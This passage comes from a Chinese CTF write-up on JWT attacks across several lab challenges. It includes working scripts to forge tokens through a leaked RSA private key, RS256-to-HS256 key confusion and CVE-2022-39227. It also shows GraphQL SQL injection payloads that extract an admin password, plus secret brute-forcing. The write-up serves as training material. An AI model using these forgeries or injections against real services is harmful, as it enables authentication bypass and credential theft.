comment\">//github.com/brendan-rius/c-jwt-cracker #下载</span>\n<span class=\"token number\">2</span>、make <span class=\"token comment\">#编译</span>\n<span class=\"token number\">3</span>、<span class=\"token operator\">.</span><span class=\"token operator\">/</span>jwtcrack <span class=\"token constant\">JWT</span> <span class=\"token comment\">#使用</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里将靶场中的JWT放入其中<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152050.png\" alt=\"在这里插入图片描述\"><br>爆破出密钥为<code>aaab</code>，接下来方法就同上，在解码网站中，修改<code>sub</code>为admin，同时添加密钥为<code>aaab</code>，然后拿着得到的新JWT，去替换网站的JWT，再去访问admin界面即可。<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152153.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"Web349\"><a href=\"#Web349\" class=\"headerlink\" title=\"Web349\"></a>Web349</h3><p>题目给了一个附件，内容如下</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">/* GET home page. */</span>\nrouter<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> privateKey <span class=\"token operator\">=</span> fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">cwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'//public//private.key'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">var</span> token <span class=\"token operator\">=</span> jwt<span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">user</span><span class=\"token operator\">:</span> <span class=\"token string\">'user'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> privateKey<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">algorithm</span><span class=\"token operator\">:</span> <span class=\"token string\">'RS256'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  res<span class=\"token punctuation\">.</span><span class=\"token function\">cookie</span><span class=\"token punctuation\">(</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">,</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  res<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token string\">'where is flag?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  \n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \nrouter<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">,</span>next</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">\"flag_here\"</span><span class=\"token punctuation\">;</span>\n\tres<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">var</span> auth <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>auth<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">var</span> cert <span class=\"token operator\">=</span> fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFileSync</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">cwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'//public/public.key'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// get public key</span>\n\tjwt<span class=\"token punctuation\">.</span><span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>auth<span class=\"token punctuation\">,</span> cert<span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> decoded</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>decoded<span class=\"token punctuation\">.</span>user<span class=\"token operator\">===</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t  \tres<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t  <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t  \tres<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token string\">'you are not admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t  <span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里发现可以获取公钥和私钥，<code>RSA</code>是用私钥加密，公钥解密，那么我们这里有私钥了，就可以自己写内容，然后用私钥加密，接下来用公钥解密就是我们伪造的内容，所以接下来访问<code>url /private.key</code>获取私钥，然后写个小脚本即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> jwt\npublic <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'private.key'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>jwt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> key<span class=\"token operator\">=</span>public<span class=\"token punctuation\">,</span> algorithm<span class=\"token operator\">=</span><span class=\"token string\">'RS256'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152199.png\" alt=\"在这里插入图片描述\"><br>接下来替换JWT，然后post访问<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152227.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web350\"><a href=\"#web350\" class=\"headerlink\" title=\"web350\"></a>web350</h3><p>题目给了附件，在里面发现公钥<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152264.png\" alt=\"在这里插入图片描述\"><br>这里的话应该考察的就是算法修改攻击，然后我们这里修改算法为<code>HS256</code>,而后用公钥加密，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">const jwt <span class=\"token operator\">=</span> require<span class=\"token punctuation\">(</span><span class=\"token string\">'jsonwebtoken'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nvar fs <span class=\"token operator\">=</span> require<span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nvar privateKey <span class=\"token operator\">=</span> fs<span class=\"token punctuation\">.</span>readFileSync<span class=\"token punctuation\">(</span><span class=\"token string\">'public.key'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nvar token <span class=\"token operator\">=</span> jwt<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> user<span class=\"token punctuation\">:</span> <span class=\"token string\">'admin'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> privateKey<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> algorithm<span class=\"token punctuation\">:</span> <span class=\"token string\">'HS256'</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>运行脚本需要安装<code>jsonwebtoken</code>库<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152331.png\" alt=\"在这里插入图片描述\"><br>得到JWT后替换一下，然后post发包即可获取flag<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152553.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"祥云杯2022-FunWeb\"><a href=\"#祥云杯2022-FunWeb\" class=\"headerlink\" title=\"[祥云杯2022]FunWeb\"></a>[祥云杯2022]FunWeb</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注：因为这道题没有复现环境了，所以我这里的部分图片是来源于网上，参考的是<code>X1r0z</code>大师傅的<a href=\"https://exp10it.cn/2022/10/2022-%E7%A5%A5%E4%BA%91%E6%9D%AF-web-writeup/#funweb%E5%A4%8D%E7%8E%B0\">https://exp10it.cn/</a></p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152579.png\" alt=\"在这里插入图片描述\"><br>进入环境后是个注册界面，接下来随便注册账号后进行登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152736.png\" alt=\"在这里插入图片描述\"><br>发现上方是有两个功能点的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152701.jpeg\" alt=\"在这里插入图片描述\"><br>抓<code>获取成绩</code>包后发现这里提示<code>no admin</code>同时发现<code>JWT</code>，想到这里可能需要伪造JWT，JWT最近新出的漏洞是<code>CVE-2022-39227</code>。那么我们就可以尝试用这个漏洞来进行伪造JWT，伪造JWT脚本如下所示</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> timedelta\n<span class=\"token keyword\">from</span> json <span class=\"token keyword\">import</span> loads<span class=\"token punctuation\">,</span> dumps\n<span class=\"token keyword\">from</span> jwcrypto<span class=\"token punctuation\">.</span>common <span class=\"token keyword\">import</span> base64url_decode<span class=\"token punctuation\">,</span> base64url_encode\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">topic</span><span class=\"token punctuation\">(</span>topic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"</span>\n    <span class=\"token punctuation\">[</span>header<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> topic<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#点分</span>\n    parsed_payload <span class=\"token operator\">=</span> loads<span class=\"token punctuation\">(</span>base64url_decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#解码</span>\n    parsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'is_admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token comment\">#伪造</span>\n    fake_payload <span class=\"token operator\">=</span> base64url_encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#编码</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'&#123;\"  '</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> fake_payload <span class=\"token operator\">+</span> <span class=\"token string\">'.\":\"\",\"protected\":\"'</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'\", \"payload\":\"'</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> <span class=\"token string\">'\",\"signature\":\"'</span> <span class=\"token operator\">+</span> signature <span class=\"token operator\">+</span> <span class=\"token string\">'\"&#125;'</span><span class=\"token comment\">#生成恶意载荷</span>\ntoken <span class=\"token operator\">=</span> topic<span class=\"token punctuation\">(</span><span class=\"token string\">'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来想到我们抓的包的文件名是<code>graphql</code>，而且还有POST参数，可能存在<code>graphql</code>注入。<br><a href=\"https://www.leavesongs.com/content/files/slides/%E6%94%BB%E5%87%BBGraphQL.pdf\">https://www.leavesongs.com/content/files/slides/GraphQL.pdf</a><br>而后使用 <code>getscoreusingnamehahaha </code>方法查询表结构。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"query\"</span><span class=\"token punctuation\">:</span> <span class=\"token triple-quoted-string string\">\"\"\"&#123; getscoreusingnamehahaha(name: \"null' union select group_concat(sql) FROM sqlite_master; --\")&#123; score name  &#125; &#125;\"\"\"</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>返回结果如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">CREATE TABLE users<span class=\"token punctuation\">(</span>\n   ID INTEGER PRIMARY KEY<span class=\"token punctuation\">,</span>\n   NAME TEXT NOT NULL<span class=\"token punctuation\">,</span>  \n   PASSWORD TEXT NOT NULL<span class=\"token punctuation\">,</span>\n   SCORE TEXT NOT Null   \n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>因此可以用这个来查询admin用户成绩，构造最终payload如下。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">from</span> jwcrypto<span class=\"token punctuation\">.</span>common <span class=\"token keyword\">import</span> base64url_decode<span class=\"token punctuation\">,</span> base64url_encode\n<span class=\"token keyword\">import</span> httpx\n\nsession <span class=\"token operator\">=</span> httpx<span class=\"token punctuation\">.</span>Client<span class=\"token punctuation\">(</span>base_url<span class=\"token operator\">=</span><span class=\"token string\">\"http://eci-2zeavdwsk859vkrseg75.cloudeci1.ichunqiu.com/\"</span><span class=\"token punctuation\">)</span>\nsession<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"/signin\"</span><span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"111\"</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">)</span>\n_ <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span>header<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span>\nparsed_payload <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>base64url_decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nparsed_payload<span class=\"token punctuation\">[</span><span class=\"token string\">'is_admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nfake_payload <span class=\"token operator\">=</span> base64url_encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>parsed_payload<span class=\"token punctuation\">,</span> separators<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nforged_jwt <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;\"  '</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'.'</span> <span class=\"token operator\">+</span> fake_payload <span class=\"token operator\">+</span> <span class=\"token string\">'.\":\"\",\"protected\":\"'</span> <span class=\"token operator\">+</span> header <span class=\"token operator\">+</span> <span class=\"token string\">'\", \"payload\":\"'</span> <span class=\"token operator\">+</span> payload <span class=\"token operator\">+</span> <span class=\"token string\">'\",\"signature\":\"'</span> <span class=\"token operator\">+</span> signature <span class=\"token operator\">+</span> <span class=\"token string\">'\"&#125;'</span>\nsession<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>delete<span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span>\nsession<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">,</span> forged_jwt<span class=\"token punctuation\">)</span>\n\ndata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"query\"</span><span class=\"token punctuation\">:</span> <span class=\"token triple-quoted-string string\">\"\"\"&#123; getscoreusingnamehahaha(name: \"null' union select password FROM users WHERE name='admin'; --\")&#123; score name  &#125; &#125;\"\"\"</span><span class=\"token punctuation\">&#125;</span>\nresponse <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"/graphql\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>得到密码后去登录即可得到flag</p>\n<h2 id=\"CISCN2019-华北赛区-Day1-Web2-ikun\"><a href=\"#CISCN2019-华北赛区-Day1-Web2-ikun\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day1 Web2]ikun\"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>进入后发现有登录和注册界面，常规操作先注册后登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152771.png\" alt=\"在这里插入图片描述\"><br>提示要买到lv6，下划后发现可以买等级<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152828.png\" alt=\"在这里插入图片描述\"><br>这里没有lv6，点击下一页看看<br>仍然没有找到lv6，但发现参数是GET型传参<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152986.png\" alt=\"在这里插入图片描述\"><br>这意味着我们可以写个小脚本来查找lv6所在位置<br>发现lv3对应的代码是lv3.png，那么lv6对应的就是lv6.png<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152011.png\" alt=\"在这里插入图片描述\"><br>脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">import</span> requests\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://8e197801-2f87-4e36-aee6-a2390b0f391e.node4.buuoj.cn:81/shop?page=\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">\"lv6.png\"</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152233.png\" alt=\"在这里插入图片描述\"><br>181页，找到后发现价格是天价，买不起<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152314.png\" alt=\"在这里插入图片描述\"><br>这里抓包看一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152388.png\" alt=\"在这里插入图片描述\"><br>发现可以修改折扣，把这个discount修改为<code>0.00000000000001</code>然后发包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152473.png\" alt=\"在这里插入图片描述\"><br>跳转到了另一个界面但无权限访问<br>再抓包<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152563.png\" alt=\"在这里插入图片描述\"><br>发现JWT，解码一下（解码网站<a href=\"https://jwt.io/\">https://jwt.io/</a>）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152628.png\" alt=\"在这里插入图片描述\"><br>我们这里想实现修改root为<code>admin</code>，需要有密钥，爆破密钥可以用工具<code>c-jwt-cracker</code>得到，链接如下<br><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a><br>破解后得到密钥为<code>1Kun</code><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152737.png\" alt=\"在这里插入图片描述\"><br>抓包，将得到的值赋给JWT，再发包<br>接下来就是读取源码，然后进行Python反序列化获取最终flag，这里不再演示。</p>\n<h1 id=\"后言\"><a href=\"#后言\" class=\"headerlink\" title=\"后言\"></a>后言</h1><p><code>JWT</code>的靶场有很多个，我这里也只是利用了<code>CTFhub</code>和<code>portswig</code>等来进行演示，还有一些靶场例如<br><a href=\"https://jwt-lab.herokuapp.com/challenges\">https://jwt-lab.herokuapp.com/challenges</a><br>也是比较好的，但鉴于考察点相似，这里不再演示，有兴趣的师傅可以自行尝试。<br>然后还有就是这里的CVE漏洞的分析我主要参考了我们战队<code>lemon</code>大师傅的讲解，大家也可以看一下哇，视频链接如下<br><a href=\"https://www.bilibili.com/video/BV15d4y1F7i3/?spm_id_from=333.337.search-card.all.click&vd_source=414113f33a1cd681c43e79462250b4d0\">https://www.bilibili.com/video/BV15d4y1F7i3</a><br>最后的话本人也只是一个小白，如果有问题还请各位大师傅多多指教。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://www.freebuf.com/articles/web/337347.html\">https://www.freebuf.com/articles/web/337347.html</a><br><a href=\"https://codex.lemonprefect.cn/writeups/3rd%20%E7%A5%A5%E4%BA%91%E6%9D%AF%20Quals.html\">https://codex.lemonprefect.cn/</a><br><a href=\"https://jwt.io/introduction/\">https://jwt.io/introduction/</a><br><a href=\"https://portswigger.net/web-security/jwt\">https://portswigger.net/web-security/jwt</a><br><a 